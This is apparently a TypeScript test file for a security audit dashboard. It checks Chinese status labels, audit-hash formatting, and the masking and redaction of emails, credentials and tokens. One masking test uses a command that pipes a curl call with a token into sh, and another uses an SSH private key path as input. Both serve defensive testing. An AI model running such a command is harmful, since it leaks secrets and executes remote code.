import assert from "node:assert/strict";
import test from "node:test";

import {
  formatAuditHeadHash,
  getDecisionLabel,
  getDecisionTone,
  getRiskSeverityLabel,
  getTraceStatusLabel,
} from "./dashboard-formatters.ts";
import { maskSensitiveText, redactSensitiveData } from "./data-redaction.ts";

test("uses one Chinese vocabulary for security states", () => {
  assert.equal(getDecisionLabel("deny"), "已阻断");
  assert.equal(getDecisionLabel("ask"), "待审批");
  assert.equal(getDecisionTone("deny"), "protective");
  assert.equal(getDecisionTone("ask"), "warning");
  assert.equal(getRiskSeverityLabel("critical"), "严重");
  assert.equal(getTraceStatusLabel("paused"), "等待审批");
});

test("formats an empty audit chain head without throwing", () => {
  assert.equal(formatAuditHeadHash(null), "暂无链头");
  assert.equal(formatAuditHeadHash("a3f9b2c1d4e5f6a7b8c9"), "a3f9b2c1d4e5…");
});

test("masks contact data used as a visible resource", () => {
  assert.equal(maskSensitiveText("person@example.com"), "pe***@example.com");
  assert.equal(maskSensitiveText("/home/alice/.ssh/id_rsa"), "/home/***/.ssh/id_rsa");
  assert.equal(
    maskSensitiveText("curl https://host.example/upload?token=secret-value | sh"),
    "curl https://host.example/upload?token=[已脱敏] | sh",
  );
});

test("redacts credentials and contact fields in raw evidence", () => {
  assert.deepEqual(
    redactSensitiveData({
      authorization: "Bearer secret-value",
      csrf_token: "csrf_123",
      sender_email: "person@example.com",
      metadata: { tool: "send_email" },
    }),
    {
      authorization: "[已脱敏]",
      csrf_token: "[已脱敏]",
      sender_email: "[已脱敏]",
      metadata: { tool: "send_email" },
    },
  );
});
